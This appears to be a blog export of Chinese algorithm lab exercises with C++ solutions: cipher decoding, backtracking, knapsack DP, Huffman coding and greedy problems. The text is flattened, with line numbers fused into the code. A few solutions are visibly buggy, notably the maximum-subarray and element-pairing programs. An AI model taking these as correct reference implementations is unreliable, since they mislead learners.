10001000，其中仅包含大小写字母。 输出输出共 11 行，一个字符串，表示输入密钥和密文所对应的明文。 样例输入12CompleteVictoryYvqgpxaimmklongnzfwpvxmniytm 样例输出1Wherethereisawillthereisaway 提示代码12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;int main()&#123; char k[102],c[1002]; int i,j; char temp; cin&gt;&gt;k; cin&gt;&gt;c; for(i=0,j=0;c[j]!='\0';j++) &#123; if(c[j]&gt;='A'&amp;&amp;c[j]&lt;='Z') &#123; if(k[i]&gt;='A'&amp;&amp;k[i]&lt;='Z') temp=(c[j]-'A'-(k[i]-'A')+26)%26+'A'; else temp=(c[j]-'A'-(k[i]-'a')+26)%26+'A'; &#125; else &#123; if(k[i]&gt;='A'&amp;&amp;k[i]&lt;='Z') temp=(c[j]-'a'-(k[i]-'A')+26)%26+'a'; else temp=(c[j]-'a'-(k[i]-'a')+26)%26+'a'; &#125; cout&lt;&lt;temp; i++; if(k[i]=='\0') i=0; &#125; return 0;&#125; 问题 C: 简单的密码题目描述密码是按特定法则编成，用以对通信双方的信息进行明密变换的符号。密码是隐蔽了真实内容的符号序列。其实就是把用公开的、标准的信息编码表示的信息通过一种变换手段，将其变为除通信双方以外其他人所不能读懂的信息编码，这种独特的信息编码就是密码。现在我们定义一种非常简单的密码，它的长度固定为n（n&lt;=30）并且每一位只能由数字0或者数字1组成，但是有一个特殊的要求：一个密码序列中至少要有连续的3个0出现才可以，否则就是无效的。现在给定你密码序列的长度n，你的任务是计算长度为n的序列能产生多少种不同的并且有效的密码？ 输入输入包含多组数据，每组数据只有一个正整数n（1&lt;=n&lt;=30）代表密码序列的长度，单独占一行。 输出对每组数据，输出一个整数，代表长度为n的序列能产生的不同密码的种类数。 样例输入123456 样例输出1233820 提示代码123456789101112#include&lt;bits/stdc++.h&gt;using namespace std;int dp[32] = &#123;0,0,0,1,3,8,20,47,107,238,520,1121,2391,5056,10616,22159,46023,95182,196132,402873,825259,1686408,3438828,6999071,14221459,28853662,58462800,118315137,239186031,483072832,974791728&#125;;int main()&#123; int n; while(cin&gt;&gt;n) &#123; cout&lt;&lt;dp[n]&lt;&lt;endl; &#125; return 0;&#125; 问题 D: 有趣的素数题目描述素数被广泛地应用于密码学中，所谓的公钥就是将想要传递的信息在编码时加入砠数，编码之后传给收信人，任何人收到此信息之后，若没有此收信人所拥有的秘钥，则在解密的过程中将会因为分解质因数过久而无法破解信息，可见素数在密码学中的重要性。现在给你n（2&lt;=n&lt;=16）个正整数1,2,3…n，你的任务是把这n个正整数组成一个环，使得任意相邻的两个整数之和为一个素数，输出有多少种合法方案。 输入多组输入数据，每组数据只有一个正整数n（2&lt;=n&lt;=16）代表有n个正整数 1,2,3…n 输出对每组数据，输出一个整数，代表有多少种不同的可行方案数。 样例输入1268 样例输出1224 提示对于输入样例中的6，有以下2种合法方案（首尾相连构成一个环） 1 4 3 2 5 6 1 6 5 2 3 4 对于输入样例中的8，有以下4种合法方案（首尾相连构成一个环） 1 2 3 8 5 6 7 4 1 2 5 8 3 4 7 6 1 4 7 6 5 8 3 2 1 6 7 4 3 8 5 2 代码12345678910111213141516171819202122232425262728293031323334353637#include&lt;bits/stdc++.h&gt; using namespace std;int n,ans,last;bool visited[32];bool isPrime[40]=&#123;0,0,1,1,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,0&#125;;void pc(int cur)&#123; if(cur == n &amp;&amp; isPrime[1+last]) &#123; ans++; return; &#125; for(int i = 2; i &lt;= n; i++) &#123; if(!visited[i] &amp;&amp; isPrime[last+i]) &#123; int t = last; last = i; visited[i] = true; pc(cur+1); visited[i] = false; last = t; &#125; &#125;&#125;int main()&#123; while(cin&gt;&gt;n) &#123; memset(visited,0,sizeof(visited)); ans = 0; last = 1; pc(1); cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0;&#125; 问题 E: 数据加密题目描述密码学是研究编制密码和破译密码的技术科学。研究密码变化的客观规律，应用于编制密码以保守通信秘密的，称为编码学；应用于破译密码以获取通信情报的，称为破译学，总称密码学。密码是通信双方按约定的法则进行信息特殊变换的一种重要保密手段。依照这些法则，变明文为密文，称为加密变换；变密文为明文，称为脱密变换。密码在早期仅对文字或数码进行加、脱密变换，随着通信技术的发展，对语音、图像、数据等都可实施加、脱密变换。现在要求你用下面给定的方法对数据实现加密。给定长度为n的字符串S（1&lt;=n&lt;=2000,S中只有大写字母）作为明文，要求构造一个字符串T作为密文，起初T是一个空串，之后反复执行以下任意操作 1.从S的头部删除一个字符，加入到T的尾部2.从S的尾部删除一个字符，加入到T的尾部 最后S会变成空串，T会变成一个长度为n的字符串作为密文。当然并非所有的构造方案都是符合条件的，我们要求构造出的密文T的字典序尽可能小，你能找出这个字典序最小的密文吗？ 输入输入包含多组数据，每组数据占两行，第一行为一个整数n（1&lt;=n&lt;=2000）代表字符串S的长度，第二行为一个长度为n的字符串S代表明文，保证S中只有大写字母 输出对每组数据，输出一行字符串，代表构造出的字典序最小的密文T 样例输入126ACDBCB 样例输出1ABCBCD 提示字典序是指从前往后比较两个字符串大小的方法。首先比较第1个字符，如果不同则第1个字符更小的字符串更小，如果相同则继续比较第2个字符……如此继续，来比较整个字符串的大小 代码12345678910111213141516171819202122232425262728293031#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int n; char str[2005],ans[2005]; while(cin&gt;&gt;n) &#123; cin&gt;&gt;str; int i = 0,j = n-1; while(i &lt;= j) &#123; bool flag = false; for(int k = 0; i+k &lt; j-k; k++) &#123; if(str[i+k] &lt; str[j-k]) &#123; flag = true; break; &#125; if(str[i+k] &gt; str[j-k]) break; &#125; if(flag) cout&lt;&lt;str[i++]; else cout&lt;&lt;str[j--]; &#125; cout&lt;&lt;endl; &#125; return 0;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（四）]]></title>
    <url>%2F2019%2F10%2F25%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C4%2F</url>
    <content type="text"><![CDATA[算法实验四。 问题 A: 判断日期是否符合格式题目描述我们知道一年有12个月，每个月最多有31天，年有平年和闰年之分，本题目要求如果输入一个日期，程序需要判断用户输入的日期是否正确。 提示：测试输入的三个数字中，年份是正数，月份和日期有可能是负数，程序需要对这两个数为负数的情况进行判断。 输入多组测试用例，对每组测试用例： 用户输入是三个数字，分别表示年，月和日。 例如 2007 10 21 ，表示2007年10月21日，这个输入经过判断是正确的。又例如输入 1993 11 38 ，这个输入经过判断是错误的，因为日期不能超过31天。 输出程序的输出分为两种，1或者0。1表示输入正确，0表示输入错误。 样例输入12011 21 10 样例输出10 提示代码1234567891011121314151617181920212223242526272829303132#include&lt;bits/stdc++.h&gt;using namespace std;int days[13] = &#123;0,31,28,31,30,31,30,31,31,30,31,30,31&#125;;bool isLeap(int y)&#123; if(y%400 == 0) return true; if(y%4 == 0 &amp;&amp; y%100) return true; return false;&#125;int main()&#123; int y,m,d; while(cin&gt;&gt;y&gt;&gt;m&gt;&gt;d) &#123; bool flag = isLeap(y); if(m &lt;= 0 || m &gt; 12 || d &lt;= 0) &#123; cout&lt;&lt;"0"&lt;&lt;endl; continue; &#125; int dd = days[m]; if(m == 2 &amp;&amp; flag) dd++; if(d &lt;= dd) &#123; cout&lt;&lt;"1"&lt;&lt;endl; continue; &#125; cout&lt;&lt;"0"&lt;&lt;endl; &#125; return 0;&#125; 问题 B: 哈夫曼编码题目描述给定一只含有小写字母的字符串；输出其哈夫曼编码的长度 输入第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500. 输出对于每个字符串，输出其哈夫曼编码长度 样例输入12343hrvshlcxeasexdphiopdmntflolfbtbpplahqolqykrqdnwdoq 样例输出1231051115 提示代码1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;bits/stdc++.h&gt; using namespace std;const int maxn = 2000;int num[30],ans;struct cmp1&#123; bool operator()(int&amp; a,int&amp; b) &#123; return a &gt; b; &#125;&#125;;int main()&#123; int t; char str[maxn]; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;str; memset(num,0,sizeof(num)); int len = strlen(str); for(int i = 0; i &lt; len; i++) num[int(str[i]-'a')]++; priority_queue&lt;int,vector&lt;int&gt;,cmp1&gt; pq; for(int i = 0; i &lt; 26; i++) if(num[i]) pq.push(num[i]); ans = 0; while(pq.size() &gt; 1) &#123; int a,b; a = pq.top(); pq.pop(); b = pq.top(); pq.pop(); pq.push(a+b); ans += a+b; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0;&#125; 问题 C: 2n皇后问题题目描述给定一个 n\n*的棋盘，棋盘中有一些位置不能放皇后。现在要向棋盘中放入 n 个黑皇后和 n个白皇后，使任意的两个黑皇后都不在同一行、同一列或同一条对角线上，任意的两个白皇后都不在同一行、同一列或同一条对角线上。问总共有多少种放法？n 小于等于 8。 输入 输入的第一行为一个整数 n，表示棋盘的大小。 ​ 接下来 n 行，每行 n 个 0 或 1 的整数，如果一个整数为1，表示对应的位置可以放皇后，如果一个整数为 0，表示对应的位置不可以放皇后。 输出输出一个整数，表示总共有多少种放法 样例输入1234541 1 1 11 1 1 11 1 1 11 1 1 1 样例输出12 提示代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include&lt;bits/stdc++.h&gt;using namespace std;const int maxn = 10;int map_q[maxn][maxn];int x1[maxn],x2[maxn],ans,n;bool check1(int xx,int yy)&#123; if(!map_q[xx][yy]) return false; for(int i = 0; i &lt; xx; i++) &#123; if(yy == x1[i]) return false; if(abs(xx - i) == abs(yy - x1[i])) return false; //斜对角 &#125; return true;&#125;bool check2(int xx,int yy)&#123; if(!map_q[xx][yy]) return false; for(int i = 0; i &lt; xx; i++) &#123; if(yy == x2[i]) return false; if(abs(xx - i) == abs(yy - x2[i])) return false; //斜对角 &#125; return true;&#125;void queen(int l)&#123; if(l == n) &#123; ans++; return; &#125; for(int i = 0; i &lt; n; i++) &#123; if(check1(l,i)) &#123; x1[l] = i; map_q[l][i] = 0; for(int j = 0; j &lt; n; j++) &#123; if(check2(l,j)) &#123; x2[l] = j; queen(l+1); x2[l] = -1; &#125; &#125; map_q[l][i] = 1; x1[l] = -1; &#125; &#125;&#125;int main()&#123; cin&gt;&gt;n; for(int i = 0; i &lt; n; i++) &#123; for(int j = 0; j &lt; n; j++) &#123; cin&gt;&gt;map_q[i][j]; &#125; &#125; ans = 0; queen(0); cout&lt;&lt;ans&lt;&lt;endl; return 0;&#125; 问题 D: 图的m着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入1234567895 8 4 1 21 3 1 42 32 42 53 44 5 样例输出148 提示代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;bits/stdc++.h&gt;using namespace std;const int maxn = 2e3 + 5;int n,k,m,ans;int map_c[maxn][maxn];int color[maxn];void dfs(int d)&#123; if(d == n+1) &#123; ans++; return; &#125; for(int i = 1; i &lt;= m; i++) //颜色m种 &#123; bool flag = true; for(int j = 1; j &lt;= n; j++) //n个点 &#123; if(map_c[d][j] &amp;&amp; color[j] == i) //连通且颜色为i则失败 &#123; flag = false; break; &#125; &#125; if(flag) &#123; color[d] = i; //染色 dfs(d+1); //下一结点 color[d] = 0; //回到未染色状态 &#125; &#125;&#125;int main()&#123; cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i = 0; i &lt; k; i++) &#123; int tmp1,tmp2; cin&gt;&gt;tmp1&gt;&gt;tmp2; map_c[tmp1][tmp2] = 1; map_c[tmp2][tmp1] = 1; &#125; dfs(1); cout&lt;&lt;ans; return 0;&#125; 问题 E: 部分和问题题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1*≤N≤*20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入12341 2 4 713 样例输出1Yes 提示代码123456789101112131415161718192021222324#include&lt;bits/stdc++.h&gt; using namespace std;const int maxn = 25;int n,a[maxn],k;bool dfs(int l,int sum)&#123; if(sum == k) return true; if(l == n) return false; return dfs(l+1,sum)||dfs(l+1,sum+a[l]);&#125;int main()&#123; while(cin&gt;&gt;n) &#123; for(int i = 0; i &lt; n; i++) cin&gt;&gt;a[i]; cin&gt;&gt;k; if(dfs(0,0)) cout&lt;&lt;"Yes"&lt;&lt;endl; else cout&lt;&lt;"No"&lt;&lt;endl; &#125; return 0;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（三）]]></title>
    <url>%2F2019%2F10%2F24%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C3%2F</url>
    <content type="text"><![CDATA[算法实验三。 问题 A: 评分系统题目描述英语俱乐部举办了一个叫做“英文金曲大赛”的节目。这个节目有好多人参加，这不，成绩出来了，渊子当是很勇敢，自告奋勇接下了算出大家的总得分的任务。当时有7个评委，每个评委都要给选手打分，现在要求去掉一个最高分和去掉一个最低分，再算出平均分。结果精确到小数点后两位。 输入测试数据包括多个实例。每组数据包括7个实数，代表评委们对该选手的评分。紧接着是选手的名字，名字的长度不超过30个字符。输入直到文件结束。 输出输出每位选手名字和最终得分，结果保留两位有效数字。 样例输入1210 10 10 10 10 10 9 xiaoyuanwang0 0 0 0 0 0 0 beast 样例输出12xiaoyuanwang 10.00beast 0.00 提示代码12345678910111213141516171819202122#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; double a[7],sum=0; while(cin&gt;&gt;a[0]) &#123; sum=a[0]; for(int i=1;i&lt;7;i++) &#123; cin&gt;&gt;a[i]; sum+=a[i]; &#125; sort(a,a+7); string s; cin&gt;&gt;s; cout&lt;&lt;s&lt;&lt;" "; sum=sum-a[0]-a[6]; sum=sum/5.0; cout&lt;&lt;setprecision(2)&lt;&lt;std::fixed&lt;&lt;sum&lt;&lt;endl; &#125;&#125; 问题 B: 节食的限制题目描述Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。 输入第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。 输出一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。 样例输入1234556 415192021 样例输出156 提示代码123456789101112131415#include&lt;bits/stdc++.h&gt;using namespace std;int dp[45001];int main()&#123; int h,z,a[501]; cin&gt;&gt;h&gt;&gt;z; for(int i=1;i&lt;=z;i++) cin&gt;&gt;a[i]; for(int i=1;i&lt;=z;i++) for(int j=h;j&gt;=a[i];j--) dp[j]=max(dp[j],dp[j-a[i]]+a[i]); cout&lt;&lt;dp[h]&lt;&lt;endl; return 0;&#125; 问题 C: 汽车费用题目描述一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。 输入第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。 输出仅一个整数表示最少费用。 样例输入1212 21 31 40 49 58 69 79 90 10115 样例输出1147 提示代码12345678910111213141516171819202122232425262728#include&lt;bits/stdc++.h&gt;using namespace std;const int inf=0x3f3f3f3f;int a[11],v[105];int main()&#123; for(int i=1;i&lt;=10;i++) &#123; cin&gt;&gt;a[i]; &#125; int n; cin&gt;&gt;n; for(int i=1;i&lt;105;i++) &#123; v[i]=inf; &#125; for(int i=1;i&lt;=n;i++) &#123; for(int j=0;j&lt;=10;j++) &#123; if(i&gt;=j) &#123; v[i]=min(v[i],v[i-j]+a[j]); &#125; &#125; &#125; cout&lt;&lt;v[n]&lt;&lt;endl;&#125; 问题 D: 法师康的工人题目描述三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。 你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。 ·最长的至少有一个工人在工作的时间段 ·最长的无人工作的时间段（从有人工作开始计） 输入输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。 输出输出为一行，用空格分隔开两个我们所求的数。 样例输入12343200 1000700 11001500 2100 样例输出1900 400 提示代码123456789101112131415161718192021222324252627282930313233343536373839#include&lt;bits/stdc++.h&gt;using namespace std;const int maxn = 5005;struct node&#123; int b,e; bool operator &lt; (const node&amp; c) const &#123; return b &lt; c.b; &#125;&#125;a[maxn];int main()&#123; int n,ans1,ans2; cin&gt;&gt;n; for(int i = 0; i &lt; n; i++) &#123; cin&gt;&gt;a[i].b&gt;&gt;a[i].e; &#125; sort(a,a+n); ans1 = a[0].e - a[0].b; ans2 = 0; int j = 0; for(int i = 1; i &lt; n; i++) &#123; if(a[i].b &lt;= a[j].e) //如果交叉或相切 &#123; a[j].e = max(a[i].e,a[j].e); ans1 = max(ans1,a[j].e-a[j].b); &#125; else &#123; ans2 = max(ans2,a[i].b-a[j].e); j = i; &#125; &#125; cout&lt;&lt;ans1&lt;&lt;" "&lt;&lt;ans2&lt;&lt;endl; return 0;&#125; 问题 E: 配对元素题目描述给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]}，从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序），并使得所有配对元素差的绝对值之和最大。 输入输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。 第3行包含n个整数，题目中的B序列。 输出一个数，最大配对 3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20； 对于30%的数据，有n≤100； 对于50%的数据，有n≤1000； 对于100%的数据，有n≤10000；a[i]，b[i]≤1000。 样例输入12342 5 6 31 4 6 7 样例输出114 提示代码1234567891011121314151617181920#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; int a[n],b[n]; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]&gt;&gt;b[i]; &#125; sort(a,a+n); sort(b,b+n); int sum=0; for(int i=0;i&lt;n;i++) &#123; sum=sum+abs(a[i]-b[n-1-i]); &#125; cout&lt;&lt;sum&lt;&lt;endl;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（二）]]></title>
    <url>%2F2019%2F10%2F23%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C2%2F</url>
    <content type="text"><![CDATA[算法实验二。 问题 A: 最长公共子序列题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 样例输入123abcfbc abfcabprogramming contest abcd mnp 样例输出123420 提示代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;bits/stdc++.h&gt;using namespace std;/*void LCSlength(int m,int n,char *x,char *y,int c[105][105],int b[105][105])&#123; int i,j; for(i=1;i&lt;=m;i++) c[i][0]=0; for(i=1;i&lt;=n;i++) c[0][i]=0; for(i=1;i&lt;=m;i++) &#123; for(j=1;j&lt;=n;j++) &#123; if(x[i]==y[i]) &#123; c[i][j]=c[i-1][j-1]+1; b[i][j]=1; &#125; else if(c[i-1][j]&gt;=c[i][j-1]) &#123; c[i][j]=c[i-1][j]; b[i][j]=2; &#125; else &#123; c[i][j]=c[i][j-1]; b[i][j]=3; &#125; &#125; &#125; &#125; */ int main() &#123; char x[105],y[105]; int c[105][105]; while(cin&gt;&gt;x+1) &#123; cin&gt;&gt;y+1; int m=strlen(x+1); int n=strlen(y+1); for(int i=0;i&lt;=m;i++) c[0][i]=0; for(int i=0;i&lt;=n;i++) c[i][0]=0; /*for(int i=0;i&lt;=105;i++) &#123; for(int j=0;j&lt;=105;j++) &#123; c[i][j]=0; b[i][j]=0; &#125; &#125;*/ for(int i=1;i&lt;=m;i++) &#123; for(int j=1;j&lt;=n;j++) &#123; if(x[i]==y[j]) c[i][j]=c[i-1][j-1]+1; else c[i][j]=max(c[i-1][j],c[i][j-1]); &#125; &#125; //cout&lt;&lt;x+1&lt;&lt;y+1&lt;&lt;endl; //cout&lt;&lt;m&lt;&lt;n&lt;&lt;endl; cout&lt;&lt;c[m][n]&lt;&lt;endl; &#125; return 0; &#125; 问题 B: 矩阵连乘题目描述给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。 输入输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。 输出对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。 数据保证结果不超过1e9。 样例输入1234563 2A 10 100B 5 50C 100 5ACBABC 样例输出127500MengMengDa 提示代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include&lt;iostream&gt;#include&lt;string.h&gt;using namespace std;int m[105][105]=&#123;0&#125;;int p[200];int maxchain(int n)&#123; for(int i=1;i&lt;=n;i++) &#123; m[i][i]=0; &#125; for(int r=2;r&lt;=n;r++) &#123; for(int i=1;i&lt;=n-r+1;i++) &#123; int j=i+r-1; m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j]; for(int k=i+1;k&lt;j;k++) &#123; int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; if(t&lt;m[i][j]) &#123; m[i][j]=t; &#125; &#125; &#125; &#125; return m[1][n];&#125;int main()&#123; int n,m; while(cin&gt;&gt;n&gt;&gt;m) &#123; char chain[30]; int h[30]; int l[30]; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;chain[i]&gt;&gt;h[i]&gt;&gt;l[i]; &#125; char test[3][105]; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;test[i]; &#125; int key; for(int i=0;i&lt;m;i++) &#123; for(int j=0;j&lt;n;j++) &#123; if(test[i][0]==chain[j]) &#123; key=j; break; &#125; &#125; p[0]=h[key]; p[1]=l[key]; int len=strlen(test[i]); int flag=1; for(int k=1;k&lt;len;k++) &#123; for(int j=0;j&lt;n;j++) &#123; if(test[i][k]==chain[j]) &#123; key=j; break; &#125; &#125; if(p[k]==h[key]) &#123; p[k+1]=l[key]; &#125; else &#123; cout&lt;&lt;"MengMengDa"&lt;&lt;endl; flag=0; break; &#125; &#125; if(flag==1) &#123; cout&lt;&lt;maxchain(len)&lt;&lt;endl; &#125; &#125; &#125;&#125; 问题 C: 01背包问题题目描述已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。 接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围） 输出对每组测试数据，输出其对应的所装物品的最大价值。 样例输入1234567110 52 62 36 55 44 6 样例输出115 提示代码123456789101112131415161718192021222324252627282930313233#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; long long w[10010],v[10010],dp[10010]; int t,m,n; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;m&gt;&gt;n; for(int i=1;i&lt;=n;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; memset(dp,0,sizeof(dp)); for(int i=1;i&lt;=n;i++) &#123; for(int j=m;j&gt;=w[i];j--) &#123; dp[j]=max(dp[j],dp[j-w[i]]+v[i]); &#125; &#125; for(int i=m;i&gt;=2;i--) &#123; if(dp[i]!=dp[i-1]) &#123; cout&lt;&lt;dp[i]&lt;&lt;endl; break; &#125; &#125; &#125; return 0;&#125; 问题 D: 最大子段和题目描述给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。 每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。 接下来一行有n个数x(-1000&lt;=x&lt;=1000)。 输出输出其对应的最大子段和。 样例输入123162 -11 4 13 -1 2 样例输出118 提示子段可为空集，答案为0 代码12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;bits/stdc++.h&gt;using namespace std;int a[10010];int sum=0;int maxsum(int n)&#123; int b=0; for(int i=0;i&lt;n;i++) &#123; if(b&gt;0) &#123; b+=a[i]; &#125; else &#123; b=a[i]; &#125; if(b&gt;sum) &#123; sum=b; &#125; &#125;&#125;int main()&#123; int t; cin&gt;&gt;t; while(t--) &#123; int k; cin&gt;&gt;k; for(int i=0;i&lt;k;i++) &#123; cin&gt;&gt;a[i]; &#125; maxsum(k); cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0;&#125; 问题 E: 汽水瓶【25】题目描述有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？ 输入输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。 输出对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0 样例输入1234310810 样例输出1231540 提示代码12345678910111213141516#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;using namespace std;int main()&#123; int n,sum=0; while(cin&gt;&gt;n&amp;&amp;n!=0)&#123; sum=0; while(n&gt;2)&#123; sum+=n/3; n=(n%3)+(n/3); &#125; if(n==2) sum++; cout&lt;&lt;sum&lt;&lt;endl; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-Brute_Force暴力破解]]></title>
    <url>%2F2019%2F10%2F22%2FBrute_Force%2F</url>
